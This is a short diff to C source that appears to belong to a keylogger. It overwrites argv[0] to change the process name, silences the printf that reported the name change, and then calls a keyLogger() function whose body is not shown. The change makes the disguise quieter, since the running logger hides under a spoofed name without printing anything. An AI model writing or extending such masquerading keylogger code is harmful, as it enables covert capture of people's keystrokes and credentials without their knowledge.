@@ -59,10 +59,9 @@ start:
 		// Copy to arv[0] to change process name  
 		strncpy(argv[0], processName, sizeof(processName)); 
 
-		printf("Process name changed to: %s \n", processName); 
+		//printf("Process name changed to: %s \n", processName); 
 
-		// Changes name every second
-		//sleep(10); 
+		// Changes name every 20 seconds 
 		keyLogger();		
 		
 		// Reset process name to NULL  
